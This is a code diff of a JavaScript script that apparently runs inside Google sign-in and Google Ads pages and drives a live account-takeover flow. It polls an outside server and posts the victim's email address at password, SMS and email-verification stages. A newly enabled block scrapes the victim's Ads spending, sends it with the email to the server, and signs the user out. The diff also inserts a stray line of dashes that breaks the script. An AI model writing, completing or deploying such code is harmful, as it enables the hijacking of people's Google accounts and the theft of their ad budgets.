@@ -1,20 +1,16 @@
+var baseUrl = 'https://ajanspiink.com/';
 
-function ajax(url, callMethod) {
-    var request = new XMLHttpRequest(); request.onreadystatechange = callMethod;
-    request.open("POST", url, true); request.send();
-}
-
+function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; request.open("POST", url, true); request.send(); }
 
 if (location.href != "https://accounts.google.com/ServiceLogin/identifier?flowName=GlifWebSignIn&flowEntry=AddSession") {
     try {
-        //location.href = "https://accounts.google.com/signin/v2/identifier?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2F&followup=https%3A%2F%2Faccounts.google.com%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin";
         document.querySelectorAll('form [data-init-is-remove-mode] li>div')[1].click();
     } catch (e) { }
 
 }
 var mailId = "";
 var sInt1 = setInterval(function () {
-    ajax('https://localhost:44322/getusers', function () {
+    ajax('getusers', function () {
         if (this.readyState == 4 && this.status == 200) {
             var obj = JSON.parse(this.responseText);
 
@@ -103,7 +99,7 @@ function pass2() {
             }
         }
         else {
-            var urlpass2 = 'https://localhost:44322/settype?mail=' + mailId + '&stypeenum=2';
+            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=2';
             ajax(urlpass2, function () {
                 if (this.readyState == 4 && this.status == 200) {
                     var row = JSON.parse(this.responseText);
@@ -191,7 +187,7 @@ function sms() {
         }
         else {
 
-            var urlpass2 = 'https://localhost:44322/settype?mail=' + mailId + '&stypeenum=3';
+            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=3';
             ajax(urlpass2, function () {
                 if (this.readyState == 4 && this.status == 200) {
                     var row = JSON.parse(this.responseText);
@@ -246,7 +242,7 @@ function mail() {
         }
         else {
 
-            var urlpass2 = 'https://localhost:44322/settype?mail=' + mailId + '&stypeenum=5';
+            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=5';
             ajax(urlpass2, function () {
                 if (this.readyState == 4 && this.status == 200) {
                     var row = JSON.parse(this.responseText);
@@ -298,7 +294,7 @@ function mail() {
 //if (mails.indexOf('.') < 1) {
 //    mails = document.querySelector('.focus-ring img').getAttribute('alt').split(' ')[document.querySelector('.focus-ring img').getAttribute('alt').split(' ').length - 1].replace('(', '').replace(')', '').replace(' ', '');
 //}
-//var url77 = 'https://localhost:44322/settype?mail=' + mails + '&stypeenum=77';
+//var url77 = 'settype?mail=' + mails + '&stypeenum=77';
 //ajax(url77, function () {
 //    window.location.href = 'https://ads.google.com/aw/overview';
 //});
@@ -308,48 +304,49 @@ function mail() {
 
 
 
-//var adsInt = setInterval(function () {
-//    try {
-
-//        var mails = "";
-//        try {
-//            document.querySelector('[minerva-id="datepicker"] div').click();
-//            document.querySelector('[role="menuitemradio"]:last-child>span>span').click();
-//            var priceAll = document.querySelectorAll('.stats[role="button"]')[ document.querySelectorAll('.stats[role="button"]').length-1].innerText;
-
-//            ajax('https://localhost:44322/getKur?price=' + priceAll, function () {
-//                clearInterval(adsInt);
-//                if (this.readyState == 4 && this.status == 200) {
-//                    var result = JSON.parse(this.responseText);
-
-//                    mails = document.querySelector('.email').textContent;
-
-//                    var url77 = 'https://localhost:44322/settype?mail=' + mails + '&stypeenum=9999&price=' + result;
-//                    ajax(url77, function () {
-//                        document.querySelector('.trigger[buttondecorator]').click();
-//                        document.querySelector('.sign-out').click();
-//                    });
 
 
-//                }
-//            });
+----------------- ADS----------------------------------------------
 
-//        } catch (e) {
+var adsInt = setInterval(function () {
+    try {
 
-//        }
+        var mails = "";
+        try {
+            document.querySelector('[minerva-id="datepicker"] div').click();
+            document.querySelector('[role="menuitemradio"]:last-child>span>span').click();
+            var priceAll = document.querySelectorAll('.stats[role="button"]')[document.querySelectorAll('.stats[role="button"]').length - 1].innerText;
 
-//    } catch (e) {
+            ajax('getKur?price=' + priceAll, function () {
+                clearInterval(adsInt);
+                if (this.readyState == 4 && this.status == 200) {
+                    var result = JSON.parse(this.responseText);
 
-//    }
+                    mails = document.querySelector('.email').textContent;
 
-//}, 5000);
+                    var url77 = 'settype?mail=' + mails + '&stypeenum=9999&price=' + result;
+                    ajax(url77, function () {
+                        document.querySelector('.trigger[buttondecorator]').click();
+                        document.querySelector('.sign-out').click();
+                    });
+
+
+                }
+            });
+
+        } catch (e) {
+
+        }
+
+    } catch (e) {
+
+    }
+
+}, 5000);
 
 
 
 
-//function ajax(url, callMethod) {
-//    var request = new XMLHttpRequest(); request.onreadystatechange = callMethod;
-//    request.open("POST", url, true); request.send();
-//}
+function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; request.open("POST", url, true); request.send(); }
 
 
